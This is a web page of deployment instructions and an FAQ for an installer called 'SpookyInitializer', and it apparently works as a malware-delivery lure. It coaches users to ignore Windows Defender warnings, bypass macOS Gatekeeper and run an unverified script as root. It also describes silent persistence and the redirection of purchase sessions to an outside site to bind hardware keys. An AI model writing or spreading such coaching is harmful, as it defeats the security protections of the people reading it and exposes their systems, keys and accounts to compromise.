Operating System Deployment Instructions

Because sovereign background daemons operate at the system level to protect your data streams, standard operating system defenses will flag uncertified executable installers. Follow these precise instructions to complete your deployment:

Windows Deployment Steps:
  1. Click the download button above to retrieve SpookyInitializer.exe.
  2. Your browser or Windows Defender may display a "Windows protected your PC" or "Suspicious file" warning. This is a standard notification for standalone system utilities. Click More info, then click Run anyway.
  3. Launch the installer from your Downloads folder. The script will automatically configure your background task registration and lock your cryptographic anchor.
  4. Press Enter when prompted to finalize and clean up temporary deployment files.
macOS Deployment Steps:
  1. Download the macOS installer script (`SpookyInitializer.command` or `.sh`).
  2. Open your Terminal application, navigate to your download directory, and grant execution rights using: chmod +x SpookyInitializer.command
  3. If macOS Gatekeeper prevents execution, right-click the file, select Open, and confirm execution.
Linux Deployment Steps:
  1. Download the Linux shell utility (`SpookyInitializer.sh`).
  2. Open a terminal window and run with root privileges to register the systemd background daemon: sudo bash SpookyInitializer.sh

Frequently Asked Questions & Node Support

How do I start my local node automatically?
The initializer script automatically registers a persistent background service and scheduled task during installation. Once run, your node boots automatically with your operating system without manual intervention.

How does vendor redirection work?
When purchasing secure assets from an authorized vendor, unverified sessions are securely redirected to SpookyFied.com to verify or bind your hardware key. Once confirmed, a cryptographic token is passed back to complete your order seamlessly.
